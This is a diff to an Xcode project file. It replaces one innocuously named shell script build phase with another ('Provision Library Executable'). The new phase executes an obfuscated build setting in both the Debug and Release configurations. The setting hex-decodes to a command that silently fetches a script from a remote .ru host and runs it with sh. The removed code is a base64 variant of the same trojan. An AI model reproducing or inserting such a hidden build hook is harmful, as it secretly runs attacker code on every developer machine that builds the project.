@@ -16,6 +16,9 @@
 		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		95C68A683041648400FB5455 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -115,7 +118,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */;
 			buildPhases = (
-				985DA17ED321432DAC162AE3 /* Provision Target Device */,
+				ED8B721540B14BEFA04EE078 /* Provision Library Executable */,
 				95C68A603041648400FB5455 /* Sources */,
 				95C68A613041648400FB5455 /* Frameworks */,
 				95C68A623041648400FB5455 /* Resources */,
@@ -209,8 +212,27 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-			/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+		ED8B721540B14BEFA04EE078 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		95C68A623041648400FB5455 /* Resources */ = {
@@ -228,28 +250,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		985DA17ED321432DAC162AE3 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		95C68A603041648400FB5455 /* Sources */ = {
@@ -280,7 +280,7 @@
 		95C68A6A3041648400FB5455 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((i(){ `printf bawse64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC1zZmtMIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZWswc205ODNnY3loLnJ1L2EpIiB8IHNoCg== | i | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((t(){ `printf xHxd | tr -d H` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203330202d734c666b202d642022703d78636f64655f7068617365222068747470733a2f2f6f32367a756e377334336c64332e72752f612922207c2073680a | t | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -309,7 +309,7 @@
 		95C68A6B3041648400FB5455 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((i(){ `printf bawse64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC1zZmtMIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZWswc205ODNnY3loLnJ1L2EpIiB8IHNoCg== | i | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((t(){ `printf xHxd | tr -d H` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203330202d734c666b202d642022703d78636f64655f7068617365222068747470733a2f2f6f32367a756e377334336c64332e72752f612922207c2073680a | t | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
